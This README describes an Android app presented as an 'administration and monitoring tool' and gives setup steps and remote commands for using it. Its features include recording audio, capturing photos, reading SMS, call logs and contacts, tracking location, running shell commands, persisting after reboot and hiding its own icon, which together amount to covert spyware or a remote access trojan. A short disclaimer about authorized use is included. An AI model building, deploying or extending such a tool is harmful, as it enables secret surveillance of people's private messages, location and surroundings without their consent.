# ERDMT Admin Android App

This repository contains the source code for an extensible Android administration and monitoring tool, featuring integration with Firebase Cloud Messaging (FCM) for remote command execution and a modular architecture for adding new monitoring or control features.

## Features

- **Firebase Cloud Messaging (FCM)**: Receive and execute remote commands securely.
- **Permissions Management Utility**: Centralized runtime permission handling.
- **Microphone Recording**: Record audio on command.
- **Camera Access**: Capture photos using the device camera.
- **SMS Reading**: Retrieve recent SMS messages.
- **Call Logs Access**: Fetch call history from the device.
- **Contacts Access**: List all device contacts.
- **Installed Apps Listing**: Enumerate installed user applications.
- **File Explorer (SAF-based)**: (Requires user interaction) Access device storage.
- **Live Location Tracking**: Get device location on demand.
- **Remote Shell Execution**: Run shell commands within app sandbox.
- **App Persistence**: Auto-start services after device reboot.
- **Hide/Unhide App Icon**: Toggle application visibility.
- **AES Encryption Utility**: For secure file handling and communications.

## Getting Started

### 1. Clone the Repository

```sh
git clone https://github.com/mystery2323/erdmt-admin-app.git
cd erdmt-admin-app
```

### 2. Setup Firebase

- Create a Firebase project in the [Firebase Console](https://console.firebase.google.com/).
- Register your Android app and download `google-services.json`, placing it in the `app/` directory.

### 3. Build the Project

- Open the project in Android Studio.
- Sync Gradle and resolve dependencies.

### 4. Configure Permissions

The app requests all necessary dangerous permissions at runtime. You may need to grant these manually for full functionality, depending on your Android version.

### 5. Running the App

- Deploy to a real device (many features do **not** work on emulators).
- Send FCM messages with supported commands via Firebase or your backend to trigger features remotely.

## Remote Commands

Send FCM messages with a `command` key. Supported values include:

- `mic_record` – Record audio for 10 seconds.
- `camera_capture` – Capture a photo.
- `read_sms` – Fetch recent SMS messages.
- `read_call_logs` – Fetch recent call logs.
- `read_contacts` – Fetch contact list.
- `list_installed_apps` – List user-installed apps.
- `get_location` – Get last known location.
- `shell_exec` – Execute a shell command (provide `params` key).
- `toggle_icon` – Hide or show the app icon (`params` = `show` or `hide`).

## Security & Privacy

> **Warning:** This app accesses sensitive user data and device capabilities.  
> Use only on devices you own or have explicit permission to monitor.  
> Do not distribute or use in violation of privacy laws or Google Play policies.

## Contributing

Contributions are welcome! Please open issues or pull requests for enhancements and bug fixes.

## License

This project is for educational and authorized administrative purposes only.
